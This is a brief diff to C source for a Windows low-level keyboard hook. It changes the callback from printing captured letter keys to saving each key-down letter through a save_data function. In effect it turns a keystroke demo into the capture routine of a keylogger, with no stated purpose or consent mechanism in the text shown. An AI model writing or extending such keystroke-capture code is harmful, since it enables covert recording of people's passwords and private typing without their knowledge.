@@ -17,8 +17,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	LPKBDLLHOOKSTRUCT kb;
 
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
-	if (kb->vkCode >= 65 && kb->vkCode <= 90)
-		printf("%c\n", (char)kb->vkCode);
+	if (kb->vkCode >= 65 && kb->vkCode <= 90 && wparam == WM_KEYDOWN)
+		save_data((char)kb->vkCode);
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 }
 
